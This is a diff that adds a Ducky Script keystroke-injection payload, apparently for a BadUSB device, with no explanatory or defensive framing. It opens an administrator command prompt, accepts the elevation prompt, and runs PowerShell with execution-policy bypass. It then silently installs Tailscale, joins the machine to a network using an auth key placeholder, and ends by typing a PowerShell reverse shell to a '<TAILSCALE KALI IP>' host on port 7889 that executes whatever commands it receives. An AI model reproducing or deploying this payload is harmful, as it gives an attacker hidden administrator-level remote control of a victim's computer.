@@ -1,0 +1,36 @@
+DELAY 1000
+
+REM === Open CMD as Admin ===
+GUI r
+DELAY 600
+STRING cmd
+DELAY 300
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 1500
+
+REM === Launch PowerShell from CMD ===
+STRING powershell -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+
+REM === Stage 2 - Download Tailscale ===
+STRING Invoke-WebRequest -Uri 'https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe' -OutFile "$env:TEMP\tailscale-setup.exe"
+ENTER
+DELAY 5000
+
+REM === Stage 3 - Install Tailscale ===
+STRING Start-Process "$env:TEMP\tailscale-setup.exe" -ArgumentList '/S' -Wait
+ENTER
+DELAY 4000
+
+REM === Stage 4 - Connect Tailscale ===
+STRING & 'C:\Program Files\Tailscale\tailscale.exe' up --authkey=<TAILSCALE KEY>
+ENTER
+DELAY 5000
+
+REM === Reverse Shell ===
+STRING $c=New-Object Net.Sockets.TCPClient('<TAILSCALE KALI IP>',7889);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}
+ENTER
+
